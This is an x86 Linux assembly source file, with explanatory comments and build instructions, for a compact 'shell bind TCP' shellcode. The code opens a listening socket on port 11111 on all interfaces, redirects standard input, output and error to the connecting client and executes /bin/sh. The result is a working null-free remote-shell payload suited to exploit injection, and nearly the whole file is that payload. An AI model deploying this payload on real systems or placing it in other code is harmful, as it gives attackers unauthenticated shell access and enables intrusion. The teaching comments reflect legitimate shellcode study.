; Tiny Shell Bind TCP - Assembly Language
; Linux/x86
;
; Written in 2013 by Geyslan G. Bem, Hacking bits
;
;   http://hackingbits.com
;   geyslan@gmail.com
;
; This source is licensed under the Creative Commons
; Attribution-ShareAlike 3.0 Brazil License.
;
; To view a copy of this license, visit
;
;   http://creativecommons.org/licenses/by-sa/3.0/
;
; You are free:
;
;    to Share - to copy, distribute and transmit the work
;    to Remix - to adapt the work
;    to make commercial use of the work
;
; Under the following conditions:
;   Attribution - You must attribute the work in the manner
;                 specified by the author or licensor (but
;                 not in any way that suggests that they
;                 endorse you or your use of the work).
;
;   Share Alike - If you alter, transform, or build upon
;                 this work, you may distribute the
;                 resulting work only under the same or
;                 similar license to this one.
;
;


; tiny_shell_bind_tcp
;
; * 73 bytes
; * null-free if the port is
;
;
; # nasm -f elf32 tiny_shell_bind_tcp.asm
; # ld -m elf_i386 tiny_shell_bind_tcp.o -o tiny_shell_bind_tcp
;
; Testing
; # ./tiny_shell_bind_tcp
; # nc 127.0.0.1 11111


global _start

section .text

_start:
	; Avoiding garbage
	; Putting zero in three registers (eax, ebx and edx), search about mul instruction for understanding

	xor ebx, ebx
	mul ebx

	; syscalls (/usr/include/asm/unistd_32.h)
	; socketcall numbers (/usr/include/linux/net.h)

	; Creating the socket file descriptor
	; int socket(int domain, int type, int protocol);
	; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)

	mov al, 102		; syscall 102 - socketcall
	inc ebx			; socketcall type (sys_socket 1)

	; socket arguments (bits/socket.h, netinet/in.h)
	push edx		; IPPROTO_IP = 0 (int)
	push ebx		; SOCK_STREAM = 1 (int)
	push 2			; AF_INET = 2 (int)

	mov ecx, esp		; ptr to argument array

	int 0x80		; kernel interruption


	; Biding the socket with an address type
	; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	; bind(sockfd, [AF_INET, 11111, INADDR_ANY], 16)

	pop ebx			; socketcall type (sys_bind 2)
	pop esi			; just to roll back on stack and overwrite the ulterior value with the next push

	; building the sockaddr_in struct (sys/socket.h, netinet/in.h and bits/sockaddr.h)
	push edx		; INADDR_ANY = 0 (uint32_t)
	push WORD 0x672b	; port in byte reverse order = 11111 (uint16_t)
				; AF_INET = 2 (unsigned short int) - is already on stack

	; bind arguments (sys/socket.h)
	push 16			; sockaddr struct size = sizeof(struct sockaddr) = 16 (socklen_t)
	push ecx		; sockaddr_in struct pointer (struct sockaddr *)
	push eax		; socket fd (int)

	mov al, 102		; syscall 102 - socketcall

	mov ecx, esp		; ptr to argument array

	int 0x80		; kernel interrruption


	; Preparing to listen the incoming connection (passive socket)
	; int listen(int sockfd, int backlog);
	; listen(sockfd, int);

	; listen arguments
	mov [ecx+4], edx	; put zero after sockfd that is already on top of stack

	mov al, 102		; syscall 102 - socketcall
	mov bl, 4		; socketcall type (sys_listen 4)

	int 0x80		; kernel interruption


	; Accepting the incoming connection
	; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
	; accept(sockfd, NULL, NULL)

        mov al, 102		; syscall 102 - socketcall
        inc ebx			; socketcall type (sys_accept 5)

	; accept arguments	; here we just don't need do nothing, the ecx already points to sockf, NULL and 16
				; you ask me: but the correct isn't sockfd, NULL, NULL? Well, 'man accept' to figure out ;D)

	int 0x80		; kernel interruption


	; Creating a interchangeably copy of the 3 file descriptors (stdin, stdout, stderr)
	; int dup2(int oldfd, int newfd);
	; dup2(clientfd, ...)

	pop ecx			; pop the sockfd integer to use as the loop counter ecx
	xchg ebx, eax		; swapping registers values to put the accepted sockfd (client) in ebx as argument in next syscall (dup2)

dup_loop:
	push 63			; syscall 63 - dup2
	pop eax

	int 0x80		; kernel interruption

	dec ecx			; file descriptor and loop counter

	jns dup_loop


	; Finally, using execve to substitute the actual process with /bin/sh
	; int execve(const char *filename, char *const argv[], char *const envp[]);
	; exevcve("/bin/sh", NULL, NULL)

	mov al, 11		; execve syscall

	; execve string argument
	; stack already contains NULL on top
	push 0x68732f2f		; "//sh"
	push 0x6e69622f		; "/bin"

	mov ebx, esp		; ptr to "/bin//sh" string

	inc ecx			; zero to argv
				; zero to envp (edx)

	int 0x80
